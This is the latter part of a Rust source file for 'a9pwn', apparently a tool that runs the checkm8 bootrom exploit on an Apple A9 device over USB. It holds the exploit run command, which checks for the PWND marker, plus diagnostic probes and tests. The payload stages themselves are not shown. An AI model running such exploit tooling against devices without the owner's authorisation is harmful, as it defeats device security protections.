                payload::A9_STRUCT_SIZE,
                payload::HANDLE_CHECKM8_STRUCT_SIZE
            );

            let configs = a9pwn::config::all_configs();
            println!("  [info] {} SoC config(s) in the table", configs.len());
            for c in configs {
                println!(
                    "         cpid=0x{:04X} cprv=0x{:02X} {} pad=0x{:X} large_leak={} hole={}",
                    c.cpid, c.cprv, c.name, c.overwrite_pad, c.large_leak, c.hole
                );
            }
            if configs.iter().all(|c| c.cpid != 0x8003) {
                println!("  [FAIL] no config for CPID 0x8003 (our device)");
                failures += 1;
            }

            if failures == 0 {
                println!();
                println!("  selftest: PASS");
                ExitCode::from(EXIT_OK)
            } else {
                println!();
                println!("  selftest: {failures} FAILURE(S)");
                ExitCode::from(EXIT_TRANSPORT)
            }
        }

        // ------------------------------------------------------------------ run
        "run" => {
            let opts = match build_options(&args) {
                Ok(o) => o,
                Err(e) => {
                    eprintln!("a9pwn: {e}");
                    return ExitCode::from(EXIT_BAD_ARGS);
                }
            };

            // Preflight gate. Running the exploit with a driver whose reset is a
            // no-op cannot succeed, and failing at the end with "not pwned" would
            // accuse the exploit. Refuse up front instead.
            //
            // E5 item 5: the capability measured HERE, while the device is
            // demonstrably present, is the one that counts. A later failed re-open
            // must never overwrite it with `Unknown` — that degradation is exactly
            // how a run which had pwned the device printed
            // `RESET_CAPABILITY_UNKNOWN` about a device `ident` described as healthy
            // seconds earlier (HANDOFF §4.6, LINUX-HANDOFF §4.5).
            let mut capability_measured_while_present: Option<(a9pwn::types::DriverClass, ResetCapability)> =
                None;
            if let Ok(t) = Transport::open_first_dfu() {
                let cap = t.reset_capability();
                capability_measured_while_present = Some((t.driver_class(), cap));
                if (cap != ResetCapability::Real) && !opts.allow_winusb {
                    let id = t.identity();
                    let v = verdict::classify(
                        &RunOutcome::Aborted("preflight: reset is not real".into()),
                        &Default::default(),
                        &id,
                        t.driver_class(),
                        cap,
                    );
                    println!("REFUSING TO RUN");
                    println!("  {}  [{}]", v.headline, v.code);
                    for e in &v.evidence {
                        println!("    evidence: {e}");
                    }
                    println!("    next    : {}", v.next_action);
                    println!();
                    println!("  Override with --allow-winusb only to prove the failure mode.");
                    return ExitCode::from(EXIT_PREFLIGHT_REFUSED);
                }
            }

            // ONE tracer, ONE writer. `run_with_tracer` records run_start/run_end,
            // flushes and prints the summary; THIS tracer owns opts.trace_path and
            // is the counter set the verdict below is classified against.
            // Previously main.rs and stages::run each opened the same path: the
            // JSONL interleaved into a corrupted line (`{"seq":2,"st{"seq":2,…`)
            // and the verdict was classified against an empty counter set while
            // the real counters sat in the other tracer.
            let mut tracer = match Tracer::new(opts.trace_path.clone(), opts.verbose) {
                Ok(t) => t,
                Err(e) => {
                    eprintln!("a9pwn: cannot open trace file: {e}");
                    return ExitCode::from(EXIT_BAD_ARGS);
                }
            };

            let outcome = stages::run_with_tracer(opts.clone(), &mut tracer);

            let counters = tracer.counters();

            // The verdict needs the device's own identity, so re-read it. After a
            // successful pwn the serial carries PWND:[checkm8].
            //
            // E5 items 3 and 4, both measured on this project:
            //  * RETRY. The Windows session re-opened ONCE, ~0.7 ms after the device
            //    had dropped and re-enumerated; the open failed, the default identity
            //    went to the classifier, and the verdict printed `PID=0x0000
            //    CPID=unknown PWND=absent` about a device that was in fact pwned
            //    (HANDOFF §4.6). A pwn is followed by a re-enumeration, so the read
            //    must wait for the device to come back rather than assume it is there.
            //  * WALL CLOCK, not attempt count. "19 open attempts" was MEASURED to be
            //    285-292 ms — the count is a property of our pacing, not of the device
            //    (LINUX-HANDOFF §4.8).
            let mut id_live: Option<DeviceIdentity> = None;
            let mut driver_live: Option<a9pwn::types::DriverClass> = None;
            let mut cap_live: Option<ResetCapability> = None;
            let wait_started = Instant::now();
            let mut attempts = 0u32;
            while wait_started.elapsed() < Duration::from_millis(2_000) {
                attempts += 1;
                if let Ok(t) = Transport::open_first_dfu() {
                    id_live = Some(t.identity());
                    driver_live = Some(t.driver_class());
                    cap_live = Some(t.reset_capability());
                    break;
                }
                std::thread::sleep(Duration::from_millis(50));
            }
            let reacquired = id_live.is_some();
            let (id, driver, cap) = match (id_live, driver_live, cap_live) {
                (Some(i), Some(d), Some(c)) => (i, d, c),
                _ => {
                    // A failed open is a missing measurement. Report it as one, and
                    // keep the capability that was measured while the device WAS
                    // present instead of degrading it to Unknown.
                    let (d, c) = capability_measured_while_present
                        .unwrap_or((a9pwn::types::DriverClass::Unknown, ResetCapability::Unknown));
                    println!();
                    println!(
                        "  note: the device could not be re-opened after {attempts} attempt(s) in \
                         {} ms; the identity below is a DEFAULT, not a reading, and the capability \
                         is the value measured before the run ({}) rather than a degraded Unknown.",
                        wait_started.elapsed().as_millis(),
                        c.as_str()
                    );
                    (DeviceIdentity::default(), d, c)
                }
            };
            if reacquired {
                println!();
                println!(
                    "  re-read       : live, after {attempts} open attempt(s) in {} ms",
                    wait_started.elapsed().as_millis()
                );
            }
            if id.is_pwned() {
                println!();
                println!("  PWND marker is present in the serial descriptor.");
            }

            let v = verdict::classify(&outcome, &counters, &id, driver, cap);
            println!();
            println!("  VERDICT  {}  [{}]", v.headline, v.code);
            for e in &v.evidence {
                println!("    evidence: {e}");
            }
            println!("    next    : {}", v.next_action);
            println!("    confidence: {:?}", v.confidence);

            exit_for(&outcome, &v.code)
        }

        // DIAGNOSTIC, Lead-only. LINUX-HANDOFF §6 **E2**: a BARE `DFU_CLRSTATUS`,
        // with no spray and no exploit around it, to isolate the §4.4 observation
        // that this device appears to leave the bus after a `CLR_STATUS`.
        //
        // WHAT THE HANDOFF ALREADY MEASURED, and why this is still worth running:
        // across every Windows trace, `DFU_CLRSTATUS` (`bm=0x21 b=4`) was sent 11
        // times; the 10 followed by any device read died immediately afterwards,
        // and the 11 traces that sent none had zero fast resets. gaster sends it in
        // exactly two places — the RESET stage's failure path (`gaster.c:843`) and
        // the last line of the A9 spray (`gaster.c:910`) — and those are exactly
        // the two places the device dies. That inference is from correlation across
        // traces. This command makes it a single-variable experiment: one bare
        // `CLR_STATUS` against a device nobody else has touched.
        //
        // The finding would be about the BOOTROM, not about our code: if a bare
        // `CLR_STATUS` drops a healthy device, then the drop in a failed run is not
        // the exploit's fault and must not be read as one.
        //
        // DRY BY DEFAULT. `--send` is required to transmit, because a `CLR_STATUS`
        // is state-changing and can cost the device. The dry run still reads the
        // identity and the DFU state and prints the exact request it would send, so
        // the tool is exercised end to end without spending the device.
        "probe-clrstatus" => {
            let send = flag(&args, "--send");
            let length = number(&args, "--length").unwrap_or(0) as u16;
            let timeout_ms = number(&args, "--timeout-ms").unwrap_or(1_000) as u32;
            let watch_ms = number(&args, "--watch-ms").unwrap_or(3_000);

            println!("a9pwn probe-clrstatus — a BARE DFU_CLRSTATUS, nothing else");
            println!();

            let mut t = match Transport::open_first_dfu() {
                Ok(t) => t,
                Err(e) => {
                    println!("  no DFU device: {e}");
                    return ExitCode::from(EXIT_NO_DEVICE);
                }
            };
            let id_before = t.identity();
            let (bus0, addr0) = t.bus_address();
            let pwnd_before = id_before.is_pwned();
            println!(
                "  device        : bus {bus0} addr {addr0}  CPID={}  PWND={}",
                id_before.cpid_hex(),
                if pwnd_before { "PRESENT" } else { "absent" }
            );
            println!(
                "  serial        : {} chars -> {} descriptor bytes (MEASURED: stock 98 chars / 198 B; \
                 pwned 113 chars / 228 B)",
                id_before.serial.len(),
                2 + 2 * id_before.serial.len()
            );

            let (state0, how0) = read_dfu_state(&mut t, timeout_ms);
            println!("  DFU state pre : {how0}");

            let req = CtrlReq::new(0x21, a9pwn::DFU_CLRSTATUS, 0, 0, length);
            println!(
                "  request       : bm=0x21 b=DFU_CLRSTATUS(4) wValue=0 wIndex=0 wLength={length}"
            );

            if !send {
                println!();
                println!("  DRY RUN — nothing was sent. Re-run with `--send` to transmit.");
                println!(
                    "  (A bare CLR_STATUS can drop this device; the dry run reads the identity \
                     and the DFU state and stops there.)"
                );
                return ExitCode::from(EXIT_OK);
            }

            let r = if length == 0 {
                t.control_no_data(req, timeout_ms)
            } else {
                let mut zeros = vec![0u8; length as usize];
                t.control(req, &mut zeros, timeout_ms)
            };
            println!(
                "  sent          : {}  transferred={}/{}  libusb_rc={}  {} us",
                r.status.as_str(),
                r.transferred,
                length,
                r.libusb_rc,
                r.micros
            );

            // Read the state again through the SAME handle first: if the device has
            // left the bus, that read is where it shows, and the error code is the
            // measurement (an unread state is not a state).
            let (state1, how1) = read_dfu_state(&mut t, timeout_ms);
            println!("  DFU state post: {how1}");
            drop(t);

            // Then watch presence with FRESH handles. The handoff is explicit that
            // libusb caches string descriptors per handle, so a new open is the only
            // honest way to re-read the marker after a re-enumeration.
            let watch = watch_presence(addr0, watch_ms);
            println!(
                "  presence      : {}",
                match (watch.disappeared, watch.absence_ms, watch.returned_addr) {
                    (false, _, _) => format!(
                        "stayed present for the whole {watch_ms} ms window (no drop)"
                    ),
                    (true, ms, Some(a)) => format!(
                        "LEFT the bus and came back after {ms} ms at addr {a}{}",
                        if a != addr0 { " (a NEW address — re-enumeration)" } else { "" }
                    ),
                    (true, ms, None) => format!(
                        "LEFT the bus after ~{ms} ms and had NOT returned within {watch_ms} ms"
                    ),
                }
            );
            println!(
                "  PWND after    : {}",
                match watch.pwnd_after {
                    Some(true) => "still present",
                    Some(false) => "ABSENT - the marker is gone",
                    None => "unread (the device did not come back)",
                }
            );
            println!();
            println!("  what this means:");
            println!(
                "    A drop here is a property of the BOOTROM's CLR_STATUS handling, not of the \
                 exploit: nothing else was sent. gaster issues this same request at \
                 `gaster.c:843` and `gaster.c:910`, so a drop is either survivable reference \
                 behaviour or something gaster's own `wait_usb_handle` (`gaster.c:202-218`) \
                 absorbs. Do not conclude the device is bricked, and do not conclude our stage \
                 code caused it."
            );
            println!(
                "    state pre={} post={}",
                state0.map(|s| a9pwn::usb::dfu_state_name(s)).unwrap_or("unread"),
                state1.map(|s| a9pwn::usb::dfu_state_name(s)).unwrap_or("unread")
            );
            ExitCode::from(EXIT_OK)
        }

        // DIAGNOSTIC, Lead-only, read-only. Aborts a GET_DESCRIPTOR(3) IN read,
        // so a zero cannot be blamed on the device refusing. Settles whether
        // libusb reports a partial byte count for a CANCELLED control transfer,
        // which decides whether our `abort_xfer=0/2048` means "the device took
        // nothing" or "the API reports nothing". Never on the exploit path; no
        // reset, no DNLOAD.
        //
        // MEASURED 2026-10-03 (Linux) — three corrections to the above, all of
        // which this branch now handles honestly:
        //   1. The index this probe sends is `FALLBACK_STRING_INDEX` (3), which
        //      THIS device does not answer at all. A "0 transferred" from that
        //      request is therefore expected for the trivial reason that no data
        //      ever existed — not because libusb hides a partial count. The probe
        //      needs the declared index (4) before it can answer its own question.
        //   2. `--deadline-ms 8` does NOT cut the read on Linux: usbmon measured
        //      the whole 198-byte descriptor completing in ~150 us. A transfer
        //      that COMPLETES is not a cancelled transfer, and reading its
        //      non-zero count as "partials survive cancellation" would be a wrong
        //      value wearing a measurement's clothes.
        //   3. Cancelling this request WEDGES EP0 on this bootrom: the device then
        //      NAKs even the index it used to answer, until a port reset clears it
        //      (MEASURED: one `a9pwn reset`, 237,818 us). So this probe is no
        //      longer "read-only" in practice — it is read-only on the device's
        //      flash/state, but it can cost a reset. Recorded in RUNG1-EVIDENCE.md §3.
        "probe-partial-count" => {
            let mut t = match Transport::open_first_dfu() {
                Ok(t) => t,
                Err(e) => {
                    eprintln!("a9pwn: {e}");
                    return ExitCode::from(EXIT_NO_DEVICE);
                }
            };
            // The deadline must EXCEED the device's answer latency but cut mid-data,
            // or a zero is expected for the trivial reason that nothing had arrived.
            // This device answers a string-descriptor read in ~6 ms and moves ~1.12 ms
            // per 64-byte packet, so 8 ms catches roughly two packets in flight.
            // `--deadline-ms 1` is a valid test only of "nothing yet".
            let deadline = number(&args, "--deadline-ms").unwrap_or(8) as u32;
            let r = t.diagnostic_partial_count_probe(deadline);
            println!("  probe       : {}", r.one_line());
            println!(
                "  transferred : {} of {} (libusb's own number)",
                r.transferred, r.requested
            );
            println!("  status      : {:?}  libusb_rc={}", r.status, r.libusb_rc);
            // The question is what libusb reports for a transfer that was CUT.
            // A completed transfer answers a different question, so it must not be
            // allowed to produce the cancellation conclusion.
            match r.status {
                a9pwn::types::XferStatus::Cancelled if r.transferred > 0 => println!(
                    "  => PARTIALS SURVIVE CANCELLATION: libusb reports a real count for a \
                     cancelled control transfer, so abort_xfer=0 means the device took nothing."
                ),
                a9pwn::types::XferStatus::Cancelled => println!(
                    "  => NO PARTIAL ON A CUT TRANSFER: libusb reports 0 for a cancelled transfer, \
                     so abort_xfer=0 cannot tell us what the device took."
                ),
                other => println!(
                    "  => NOT A VALID TEST OF CANCELLATION: the transfer ended {other:?}, not \
                     Cancelled, so whatever count it reports describes a transfer that was \
                     allowed to finish. Shorten --deadline-ms until the status is Cancelled, or \
                     (better) measure the 0x800-byte DNLOAD on the real exploit path, where the \
                     window is known to cut."
                ),
            }
            ExitCode::from(EXIT_OK)
        }

        other => {
            eprintln!("a9pwn: unknown command '{other}'");
            usage();
            ExitCode::from(EXIT_BAD_ARGS)
        }
    }
}

/// One `DFU_GETSTATUS`. Returns `(bState, human line)`.
///
/// `bState` is byte 4 of the 6-byte status response (DFU 1.1 §6.1.2:
/// `bStatus`, `bwPollTimeout[3]`, `bState`, `iString`). The `Option` is
/// load-bearing: "the state could not be read" and "the state is X" are different
/// facts, and collapsing them is how an unread value becomes a wrong one — the
/// Windows session reported `DFU state 5 -> 5` from a read that had not happened.
fn read_dfu_state(t: &mut Transport, timeout_ms: u32) -> (Option<u8>, String) {
    let req = CtrlReq::new(0xA1, a9pwn::DFU_GETSTATUS, 0, 0, 6);
    let mut buf = [0u8; 6];
    let r = t.control(req, &mut buf, timeout_ms);
    if r.status == XferStatus::Ok && r.transferred >= 6 {
        let s = buf[4];
        (
            Some(s),
            format!(
                "{} (0x{s:02X})  [read OK, {} bytes, {} us]",
                a9pwn::usb::dfu_state_name(s),
                r.transferred,
                r.micros
            ),
        )
    } else {
        (
            None,
            format!(
                "UNREAD — {} (libusb_rc={}) after {} us. An unread state is not a state: this is \
                 what a device that has left the bus looks like",
                r.status.as_str(),
                r.libusb_rc,
                r.micros
            ),
        )
    }
}

struct PresenceWatch {
    disappeared: bool,
    absence_ms: u64,
    returned_addr: Option<u8>,
    pwnd_after: Option<bool>,
}

/// Poll for the device with FRESH handles and report wall-clock absence.
///
/// Wall clock, not an attempt count: LINUX-HANDOFF §4.8 MEASURED that "19 open
/// attempts" was really 285-292 ms, and a count of opens is a property of this
/// loop's pacing, not of the device.
fn watch_presence(addr0: u8, budget_ms: u64) -> PresenceWatch {
    let start = Instant::now();
    let mut w = PresenceWatch {
        disappeared: false,
        absence_ms: 0,
        returned_addr: None,
        pwnd_after: None,
    };
    let mut left_at: Option<Instant> = None;
    while start.elapsed() < Duration::from_millis(budget_ms) {
        match Transport::open_first_dfu() {
            Ok(t) => {
                let (_, addr) = t.bus_address();
                if let Some(t0) = left_at.take() {
                    w.absence_ms = t0.elapsed().as_millis() as u64;
                    w.returned_addr = Some(addr);
                }
                // Only read the marker once the device is back and settled; a read
                // racing a re-enumeration is how "PWND absent" became a NULL READ
                // (HANDOFF §4.6).
                if w.disappeared && w.returned_addr.is_some() {
                    w.pwnd_after = Some(t.identity().is_pwned());
                    if addr != addr0 {
                        return w;
                    }
                    // Same address: keep watching briefly in case it moves again.
                }
            }
            Err(_) => {
                if !w.disappeared {
                    w.disappeared = true;
                    left_at = Some(Instant::now());
                } else if left_at.is_none() {
                    left_at = Some(Instant::now());
                }
            }
        }
        std::thread::sleep(Duration::from_millis(25));
    }
    w
}

#[cfg(test)]
mod usage_dispatch {
    //! **A usage line is not a dispatch arm.** The claim lives in the usage text and the behaviour
    //! lives in the `match`; a command can be documented and unrunnable at the same time, and this
    //! file already shipped that once (`readwindow` listed, `"readwindow" =>` absent).
    //!
    //! This is the check that would have caught it: **every command the usage text names must be
    //! dispatchable in `main`'s match**, and the check has a firing control
    //! (`control_a_removed_arm_is_reported`) so it cannot pass by finding nothing.

    use std::collections::BTreeSet;

    /// Commands named in the `COMMANDS` block of the usage string.
    fn usage_commands(src: &str) -> BTreeSet<String> {
        let mut out = BTreeSet::new();
        let block = match (src.find("COMMANDS\\n"), src.find("OPTIONS\\n")) {
            (Some(a), Some(b)) if a < b => &src[a..b],
            _ => panic!("the usage text no longer has a COMMANDS..OPTIONS block to check"),
        };
        for line in block.lines() {
            let line = line.trim_start_matches(' ');
            if line.starts_with('\\') || line.is_empty() {
                continue;
            }
            // `ident       read-only: ...` — the first token, then at least two spaces.
            let name: String = line.chars().take_while(|c| c.is_ascii_lowercase() || *c == '-').collect();
            if name.is_empty() {
                continue;
            }
            let rest = &line[name.len()..];
            if rest.starts_with("  ") {
                out.insert(name);
            }
        }
        out
    }

    /// Commands that are dispatch arms: `"name" =>` or `"name" | "other" =>`.
    fn dispatch_commands(src: &str) -> BTreeSet<String> {
        let mut out = BTreeSet::new();
        for (i, _) in src.match_indices('"') {
            let tail = &src[i + 1..];
            let name: String = tail
                .chars()
                .take_while(|c| c.is_ascii_lowercase() || *c == '-')
                .collect();
            if name.is_empty() || !tail[name.len()..].starts_with('"') {
                continue;
            }
            // Look at the rest of the line: only `| "x"` items may precede `=>`.
            let line_end = tail.find('\n').unwrap_or(tail.len());
            let rest = &tail[name.len() + 1..line_end];
            let before_arrow = rest.split("=>").next().unwrap_or("");
            let only_alternatives = before_arrow
                .split('|')
                .all(|part| {
                    let p = part.trim();
                    p.is_empty()
                        || (p.starts_with('"') && p.ends_with('"') && p.len() >= 2)
                });
            if rest.contains("=>") && only_alternatives {
                out.insert(name);
            }
        }
        out
    }

    /// The file **before** this test module: the test module's own string literals name commands
    /// (including in the firing control below), and scanning them would mask a deleted arm — which
    /// is exactly how the first version of this check passed with the arm gone.
    fn body(src: &str) -> &str {
        match src.find("\n#[cfg(test)]\nmod usage_dispatch") {
            Some(k) => &src[..k],
            None => src,
        }
    }

    fn missing(src: &str) -> Vec<String> {
        let src = body(src);
        let u = usage_commands(src);
        let d = dispatch_commands(src);
        u.difference(&d).cloned().collect()
    }

    #[test]
    fn every_usage_command_is_dispatchable() {
        let src = include_str!("main.rs");
        let u = usage_commands(src);
        assert!(
            u.contains("readwindow") && u.contains("run") && u.contains("plan"),
            "the usage parser found {u:?}; it is not reading the COMMANDS block"
        );
        let missing = missing(src);
        assert!(
            missing.is_empty(),
            "these commands are documented in the usage text but have no `match` arm in main: \
             {missing:?}. A usage line is a claim; the arm is the behaviour."
        );
    }

    /// **Firing control.** Delete the `readwindow` arm from a copy of this file's own text and the
    /// check must name it. If this test ever passes with the arm gone, the check above is dead.
    #[test]
    fn control_a_removed_arm_is_reported() {
        let src = include_str!("main.rs");
        let start = src
            .find("        \"readwindow\" => {")
            .expect("the arm is present to begin with");
        // Cut from the arm to the next `// ---- ` banner, which is the next command's comment.
        let rest = &src[start + 10..];
        let cut = rest
            .find("        // ---")
            .map(|k| start + 10 + k)
            .unwrap_or(src.len());
        let doctored = format!("{}{}", &src[..start], &src[cut..]);
        assert_eq!(missing(&doctored), vec!["readwindow".to_string()]);
    }
}
